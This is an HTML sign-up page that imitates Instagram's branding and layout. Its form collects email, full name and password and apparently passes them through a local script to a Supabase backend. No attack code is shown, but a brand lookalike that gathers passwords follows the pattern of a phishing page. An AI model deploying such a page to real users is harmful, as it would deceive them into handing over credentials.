<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="output.css" />
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
      rel="stylesheet"
    />
    <title>Sign up • Instagram</title>
  </head>
  <body
    class="bg-gray-50 flex flex-col min-h-screen justify-center items-center antialiased font-sans p-4"
  >
    <div class="w-full max-w-[350px] flex flex-col gap-2.5 relative">
      <!-- Signup Container Layout -->
      <div
        class="bg-white border border-gray-300 rounded-[1px] pt-[22px] pb-[25px] px-10 flex flex-col items-center relative"
      >
        <!-- Back Button -->
        <a
          href="javascript:history.back()"
          class="absolute top-4 left-4 text-gray-700 hover:text-black transition text-lg"
          title="Go Back"
        >
          <i class="fas fa-arrow-left"></i>
        </a>

        <!-- Logo -->
        <h1
          class="text-3xl font-serif italic font-semibold tracking-wide text-gray-900 select-none cursor-default mb-3"
          style="font-family: &quot;Grand Hotel&quot;, cursive, sans-serif"
        >
          Instagram
        </h1>

        <p
          class="text-sm font-semibold text-gray-400 text-center mb-4 leading-snug"
        >
          Sign up to see photos and videos from your friends.
        </p>

        <button
          class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white text-sm font-semibold py-1.5 rounded-[4px] flex items-center justify-center gap-2 mb-4 transition-all"
        >
          <i class="fab fa-facebook-square text-base"></i> Log in with Facebook
        </button>

        <div class="w-full flex items-center justify-between mb-4">
          <div class="h-[1px] bg-gray-200 w-full"></div>
          <span
            class="text-[12px] font-semibold text-gray-400 uppercase mx-4 tracking-wider"
            >OR</span
          >
          <div class="h-[1px] bg-gray-200 w-full"></div>
        </div>

        <!-- Form Elements -->
        <form class="w-full space-y-1.5" onsubmit="return false;">
          <input
            type="email"
            id="emailAddress"
            placeholder="Mobile Number or Email"
            required
            class="w-full px-2 py-2 border border-gray-200 bg-gray-50 rounded-[3px] text-xs focus:outline-none focus:border-gray-400 placeholder-gray-400 text-gray-800 transition"
          />
          <input
            type="text"
            id="fullName"
            placeholder="Full Name"
            required
            class="w-full px-2 py-2 border border-gray-200 bg-gray-50 rounded-[3px] text-xs focus:outline-none focus:border-gray-400 placeholder-gray-400 text-gray-800 transition"
          />
          <input
            type="password"
            id="password"
            placeholder="Password"
            required
            class="w-full px-2 py-2 border border-gray-200 bg-gray-50 rounded-[3px] text-xs focus:outline-none focus:border-gray-400 placeholder-gray-400 text-gray-800 transition"
          />

          <p class="text-[11px] text-gray-400 text-center py-2.5 leading-tight">
            People who use our service may have uploaded your contact
            information to Instagram.
            <a href="#" class="font-semibold hover:underline">Learn More</a>
          </p>

          <button
            type="submit"
            class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white text-sm font-semibold py-1.5 rounded-[4px] transition-all tracking-wide"
          >
            Sign up
          </button>
        </form>
      </div>

      <!-- Footer Account Switcher Frame -->
      <div
        class="bg-white border border-gray-300 rounded-[1px] py-6 text-center text-sm text-gray-800"
      >
        Have an account?
        <a
          href="login.html"
          class="text-[#0095f6] font-semibold hover:underline"
          >Log in</a
        >
      </div>
    </div>

    <!-- Connect to Supabase CDN and custom logic -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="index.js"></script>
  </body>
</html>
